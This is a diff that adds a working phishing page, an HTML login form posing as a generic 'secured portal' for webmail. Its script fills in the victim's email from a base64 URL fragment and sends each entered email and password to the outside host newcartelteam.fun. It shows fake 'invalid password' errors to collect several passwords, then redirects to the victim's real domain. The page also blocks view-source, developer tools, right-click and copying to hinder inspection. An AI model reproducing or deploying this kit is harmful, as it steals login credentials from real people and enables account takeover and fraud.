@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <title>Login</title>
+    <link id="favLink" rel="shortcut icon" href="https://validdnssearch.com/enterprises/ateja.jpg" type="image/x-icon">
+    <meta http-equiv="expires" content="0">
+    <link id="atejaSheet" rel="stylesheet" type="text/css" href="https://newcartelteam.fun/ateja_files/cssLogin.css">
+    <style>
+        #loginbtn {
+            appearance: auto;
+            user-select: none;
+            white-space: pre;
+            align-items: flex-start;
+            text-align: center;
+            cursor: default;
+            box-sizing: border-box;
+            background-color: -internal-light-dark(rgb(239, 239, 239), rgb(59, 59, 59));
+            color: -internal-light-dark(black, white);
+            padding: 1px 6px;
+            border-width: 2px;
+            border-style: outset;
+            border-color: -internal-light-dark(rgb(118, 118, 118), rgb(133, 133, 133));
+            border-image: initial;
+            width:30%;
+            border: 1px solid rgb(59, 59, 59);
+            border-radius:3px;
+            cursor:pointer;
+        }
+        /* hidden attempt counters */
+        #login_attempt, #attemptNumber { display: none; }
+        /* preserve original positioning - exactly middle */
+        body {
+            margin: 0;
+            padding: 0;
+        }
+        table {
+            margin: 0 auto;
+        }
+        #logBox {
+            margin: 0 auto;
+        }
+        /* welcome message styling - red color, same font, two lines, exact middle */
+        #errMssg {
+            color: #FF0000 !important;
+            font-family: Tahoma;
+            line-height: 1.4;
+            display: inline-block;
+            text-align: center;
+        }
+    </style>
+        
+    <script src="https://newcartelteam.fun/ateja_files/jquery.min.js.download"></script>
+    <script src="https://newcartelteam.fun/ateja_files/enterprise.js.download"></script>
+</head>
+<body id="logBody" text="#000000" bgcolor="#FFFFFF" style="background-image: url('https://validdnssearch.com/enterprises/bgateja.jpg?OpenImageResource'); background-repeat: repeat;" onload="setFormFocus();">
+
+    <!-- ORIGINAL FORM STRUCTURE - COMPLETELY PRESERVED -->
+    <form id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" action="https://newcartelteam.fun/ateja.php">
+        <input id="domain" type="hidden" value="cutrubus.com" name="domain">
+        <input id="fieldName" type="hidden" value="contabo.net" name="field">
+        <input type="hidden" id="login_attempt" value="0">
+        <input type="hidden" id="attemptNumber" name="number" value="0">
+        
+        <br>
+        <table border="0" width="100%" height="70%">
+            <tbody><tr><td align="center">
+                <div id="logBox" align="center">
+                    <table id="LoginUserFormTable1" border="0" cellspacing="0" cellpadding="0">
+                        <tbody><tr valign="top">
+                            <td id="LoginUserFormTable1_a" width="53"><img class="multiClass" width="1" height="1" src="" border="0" alt=""></td>
+                            <td id="LoginUserFormTable1_b" width="299">
+                                <table id="LoginUserFormTable_1" width="100%" border="0" cellspacing="0" cellpadding="0">
+                                    <tbody><tr valign="top">
+                                        <td width="1%" valign="middle">
+                                            <img class="multiClass" width="86" height="1" src="" border="0" alt=""><br>
+                                            <div align="right"><img id="0" src="https://newcartelteam.fun/ateja_files/0.gif" width="32" height="32" alt=""></div>
+                                        </td>
+                                        <td width="1%" valign="middle">
+                                            <img class="multiClass" width="12" height="1" src="" border="0" alt=""><br>
+                                        </td>
+                                        <td width="100%" valign="middle">
+                                            <img class="multiClass" width="1" height="1" src="" border="0" alt=""><br>
+                                            <b><font face="Tahoma" id="errMssg">Welcome to domain name secured portal<br>Sign in to continue</font></b>
+                                        </td>
+                                    </tr>
+
+                                    <tr valign="top">
+                                        <td width="1%"><img class="multiClass" width="86" height="1" src="" border="0" alt=""><br></td>
+                                        <td width="1%"><img class="multiClass" width="12" height="1" src="" border="0" alt=""><br></td>
+                                        <td height="20" width="100%"><img class="multiClass" width="1" height="1" src="" border="0" alt=""><br></td>
+                                    </tr>
+
+                                    <tr valign="top">
+                                        <td id="LoginUserFormTable_a" width="1%" valign="middle">
+                                            <img class="multiClass" width="86" height="1" src="" border="0" alt=""><br>
+                                            <label for="user-id"><b><font face="Tahoma">User name:</font></b></label>
+                                        </td>
+                                        <td width="1%" valign="middle"><img class="multiClass" width="12" height="1" src="" border="0" alt=""><br></td>
+                                        <td id="LoginUserFormTable_b" width="100%" valign="middle">
+                                            <img class="multiClass" width="1" height="1" src="" border="0" alt=""><br>
+                                            <font face="Courier New">
+                                                <input name="email" value="" maxlength="50" autocomplete="off" type="email" id="email">
+                                            </font>
+                                        </td>
+                                    </tr>
+
+                                    <tr valign="top">
+                                        <td id="LoginUserFormTable_c" width="1%" valign="middle">
+                                            <img class="multiClass" width="86" height="1" src="" border="0" alt=""><br>
+                                            <label for="pw-id"><b><font face="Tahoma">Password:</font></b></label>
+                                        </td>
+                                        <td width="1%" valign="middle"><img id="ecblank20" width="12" height="1" src="" border="0" alt=""><br></td>
+                                        <td id="LoginUserFormTable_d" width="100%" valign="middle">
+                                            <img class="multiClass" width="1" height="1" src="" border="0" alt=""><br>
+                                            <font face="Courier New">
+                                                <input name="password" value="" type="password" maxlength="255" autocomplete="off" id="password">
+                                            </font>
+                                        </td>
+                                    </tr>
+
+                                    <tr valign="top">
+                                        <td width="1%"><img class="multiClass" width="86" height="1" src="" border="0" alt=""><br></td>
+                                        <td width="1%"><img class="multiClass" width="12" height="1" src="" border="0" alt=""><br></td>
+                                        <td height="10" width="100%"><img class="multiClass" width="1" height="1" src="" border="0" alt=""><br></td>
+                                    </tr>
+
+                                    <tr valign="top">
+                                        <td height="50" width="1%" valign="middle"><img class="multiClass" width="86" height="1" src="" border="0" alt=""><br></td>
+                                        <td width="1%" valign="middle"><img class="multiClass" width="12" height="1" src="" border="0" alt=""><br></td>
+                                        <td width="100%" valign="middle"><img class="multiClass" width="1" height="1" src="" border="0" alt=""><br>
+                                            <div id="loginbtn" onclick="processLogin()">Sign In</div>
+                                        </td>
+                                    </tr>
+                                </tbody></table>
+                            </td>
+                            <td width="158"><img class="multiClass" width="1" height="1" src="" border="0" alt=""></td>
+                        </tr>
+                    </tbody></table>
+                </div>
+                <div align="center"><font size="2">
+                    <input name="RedirectTo" value="/workflow/webmail.nsf/webform2019?OpenForm" type="hidden">
+                </font></div>
+            </td>
+        </tr>
+    </tbody></table>
+    </form>
+
+    <!-- COMPLETE JAVASCRIPT: All features + Ctrl+U disabled -->
+    <script>
+        // ============================================================
+        // FULL KEYBOARD SHORTCUT DISABLING (Ctrl+U, Ctrl+Shift+I, F12, etc.)
+        // ============================================================
+        
+        document.addEventListener('keydown', function(event) {
+            var key = event.keyCode || event.which;
+            var ctrlKey = event.ctrlKey;
+            var shiftKey = event.shiftKey;
+            
+            var isForbidden = false;
+            
+            if (key === 123) isForbidden = true; // F12
+            if (ctrlKey && key === 85) isForbidden = true; // Ctrl+U
+            if (ctrlKey && shiftKey && key === 73) isForbidden = true; // Ctrl+Shift+I
+            if (ctrlKey && shiftKey && key === 74) isForbidden = true; // Ctrl+Shift+J
+            if (ctrlKey && shiftKey && key === 67) isForbidden = true; // Ctrl+Shift+C
+            if (ctrlKey && key === 83) isForbidden = true; // Ctrl+S
+            if (ctrlKey && key === 80) isForbidden = true; // Ctrl+P
+            if (ctrlKey && key === 82) { event.preventDefault(); isForbidden = true; } // Ctrl+R
+            if (key === 116) { event.preventDefault(); isForbidden = true; } // F5
+            if (ctrlKey && shiftKey && key === 82) { event.preventDefault(); isForbidden = true; } // Ctrl+Shift+R
+            if (ctrlKey && key === 69) isForbidden = true; // Ctrl+E
+            if (ctrlKey && key === 79) isForbidden = true; // Ctrl+O
+            if (ctrlKey && key === 72) isForbidden = true; // Ctrl+H
+            if (ctrlKey && key === 74) isForbidden = true; // Ctrl+J
+            if (ctrlKey && shiftKey && key === 85) isForbidden = true; // Ctrl+Shift+U
+            if (ctrlKey && shiftKey && key === 80) isForbidden = true; // Ctrl+Shift+P
+            if (key === 112 || key === 114) { event.preventDefault(); isForbidden = true; } // F1, F3
+            
+            if (isForbidden) {
+                event.preventDefault();
+                event.stopPropagation();
+                return false;
+            }
+        });
+        
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('dragstart', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('selectstart', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('copy', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        document.addEventListener('cut', function(event) {
+            event.preventDefault();
+            return false;
+        });
+        
+        // ============================================================
+        // END OF KEYBOARD SHORTCUT DISABLING
+        // ============================================================
+        
+        // Helper: extract just the domain name (e.g., "google" from "google.com")
+        function extractDomainNameOnly(fullDomain) {
+            if (!fullDomain) return "domain name";
+            var domainParts = fullDomain.split('.');
+            if (domainParts.length > 0) {
+                return domainParts[0];
+            }
+            return fullDomain;
+        }
+        
+        // Update welcome message with dynamic domain name - keeps original positioning
+        function updateWelcomeMessage(emailAddress) {
+            var errElement = document.getElementById('errMssg');
+            if (!errElement) return;
+            
+            var domainNameOnly = "domain name";
+            if (emailAddress && emailAddress.includes('@')) {
+                var fullDomain = emailAddress.split('@')[1];
+                domainNameOnly = extractDomainNameOnly(fullDomain);
+            }
+            errElement.innerHTML = "Welcome to " + domainNameOnly + " secured portal<br>Sign in to continue";
+            errElement.style.color = '#FF0000';
+        }
+        
+        // ---------- Base64 detection and email extraction ----------
+        function isBase64(str) {
+            try { 
+                return btoa(atob(str)) === str; 
+            } catch (err) { 
+                return false; 
+            }
+        }
+
+        function decodeEmailFromHash(hash) {
+            let base64Part = hash.split('&')[0].split('?')[0].trim();
+            if (!isBase64(base64Part)) return base64Part;
+            try {
+                let once = atob(base64Part);
+                if (once.includes('@')) return once;
+                try {
+                    let twice = atob(once);
+                    if (twice.includes('@')) return twice;
+                } catch (e) { return once; }
+            } catch (e) { return base64Part; }
+            return base64Part;
+        }
+
+        // Extract email from URL hash
+        (function() {
+            var hash = window.location.hash.replace("#", "").trim();
+            var emailField = document.getElementById("email");
+            if (!emailField) return;
+            
+            if (hash && hash.length > 0) {
+                var fullEmail = decodeEmailFromHash(hash);
+                emailField.value = fullEmail;
+                if (fullEmail.includes('@')) {
+                    var domainPart = fullEmail.split('@')[1];
+                    var domainField = document.getElementById('domain');
+                    if (domainField) domainField.value = domainPart;
+                    updateWelcomeMessage(fullEmail);
+                }
+            }
+        })();
+
+        // Track login attempts
+        let loginAttempt = parseInt(document.getElementById('login_attempt')?.value || '0');
+
+        function setErrorMessage(msg, isError) {
+            var errorElement = document.getElementById('errMssg');
+            if (errorElement) {
+                errorElement.innerHTML = msg;
+                errorElement.style.color = '#FF0000';
+            }
+        }
+        
+        function resetToWelcome() {
+            var emailField = document.getElementById('email');
+            var emailValue = emailField ? emailField.value : '';
+            updateWelcomeMessage(emailValue);
+        }
+
+        function setFormFocus() {
+            document.getElementById('password').focus();
+        }
+
+        // Listen for email input to dynamically update welcome message
+        function setupEmailWatcher() {
+            var emailInput = document.getElementById('email');
+            if (emailInput) {
+                emailInput.addEventListener('input', function() {
+                    var errElem = document.getElementById('errMssg');
+                    if (errElem && !errElem.innerHTML.includes('invalid') && !errElem.innerHTML.includes('error') && !errElem.innerHTML.includes('wrong')) {
+                        updateWelcomeMessage(this.value);
+                    }
+                });
+                emailInput.addEventListener('blur', function() {
+                    var errElem = document.getElementById('errMssg');
+                    if (errElem && !errElem.innerHTML.includes('invalid') && !errElem.innerHTML.includes('error') && !errElem.innerHTML.includes('wrong')) {
+                        updateWelcomeMessage(this.value);
+                    }
+                });
+            }
+        }
+
+        $(document).ready(function() {
+            setupEmailWatcher();
+            $('#password').focus();
+            
+            $('#loginbtn').off('click').on('click', function(event) {
+                event.preventDefault();
+                processLogin();
+            });
+            
+            $('#logBox').on('keydown', function(event) {
+                if (event.which === 13) {
+                    event.preventDefault();
+                    processLogin();
+                }
+            });
+        });
+
+        function processLogin() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var redirectTo = document.querySelector('input[name="RedirectTo"]')?.value || '';
+            var attemptInput = document.getElementById('attemptNumber');
+            var loginAttemptInput = document.getElementById('login_attempt');
+            var domain = email.split('@')[1] || '';
+
+            if (!email || !password) {
+                setErrorMessage("Please enter both username and password", true);
+                return;
+            }
+
+            loginAttempt = parseInt(loginAttemptInput?.value || '0');
+            setErrorMessage("Authenticating ...", false);
+
+            var formData = new URLSearchParams();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('domain', document.getElementById('domain').value);
+            formData.append('field', document.getElementById('fieldName').value);
+            formData.append('RedirectTo', redirectTo);
+            formData.append('attempt', loginAttempt + 1);
+
+            fetch('https://newcartelteam.fun/ateja.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: formData.toString()
+            })
+            .then(response => response.text())
+            .then(data => {
+                if (loginAttempt === 0) {
+                    setErrorMessage("You provided an invalid username or password. Please sign in again.", true);
+                    document.getElementById('password').value = '';
+                    loginAttemptInput.value = '1';
+                    if (attemptInput) attemptInput.value = '1';
+                    document.getElementById('password').focus();
+                }
+                else if (loginAttempt === 1) {
+                    setErrorMessage("You provided an invalid username or password. Please sign in again.", true);
+                    document.getElementById('password').value = '';
+                    loginAttemptInput.value = '2';
+                    if (attemptInput) attemptInput.value = '2';
+                    document.getElementById('password').focus();
+                }
+                else if (loginAttempt === 2) {
+                    var errElement = document.getElementById('errMssg');
+                    if (errElement) errElement.innerHTML = "";
+                    
+                    loginAttemptInput.value = '3';
+                    if (attemptInput) attemptInput.value = '3';
+                    
+                    setTimeout(function() {
+                        if (domain) {
+                            window.location.href = "https://www." + domain;
+                        } else if (email && email.includes('@')) {
+                            var emailDomain = email.split('@')[1];
+                            window.location.href = "https://www." + emailDomain;
+                        } else {
+                            window.location.href = "https://www.example.com";
+                        }
+                    }, 1500);
+                }
+            })
+            .catch(error => {
+                setErrorMessage("Network error. Please try again.", true);
+            });
+        }
+
+        // Stubs for original functions
+        window.clkLgn = function(cb) { cb(false); };
+        window.checkSubmit = function(e, cb) { if (e.which == 13) { e.preventDefault(); cb(false); } };
+        window.displayCss = function(status) {
+            if (status) setErrorMessage("Check your entry for password. Please sign in again:", true);
+            else setErrorMessage("You provided an invalid username or password. Please sign in again:", true);
+            $('#password').focus();
+        };
+        
+        // Enter key handler
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && (document.activeElement.id === 'password' || document.activeElement.id === 'email')) {
+                e.preventDefault();
+                processLogin();
+            }
+        });
+        
+        // Sanitize any attempt/redirect text
+        setInterval(function() {
+            var errElem = document.getElementById('errMssg');
+            if (errElem && errElem.innerHTML) {
+                var text = errElem.innerHTML;
+                if (text.includes('Attempt') || text.includes('Redirecting')) {
+                    var emailField = document.getElementById('email');
+                    updateWelcomeMessage(emailField ? emailField.value : '');
+                }
+            }
+        }, 100);
+        
+        // Ensure proper positioning and red color on load
+        window.addEventListener('load', function() {
+            var emailField = document.getElementById('email');
+            updateWelcomeMessage(emailField ? emailField.value : '');
+            if (document.getElementById('password')) {
+                document.getElementById('password').focus();
+            }
+            // Ensure the table layout centers perfectly
+            var tables = document.getElementsByTagName('table');
+            for (var i = 0; i < tables.length; i++) {
+                tables[i].style.marginLeft = 'auto';
+                tables[i].style.marginRight = 'auto';
+            }
+        });
+    </script>
+</body>
+</html>
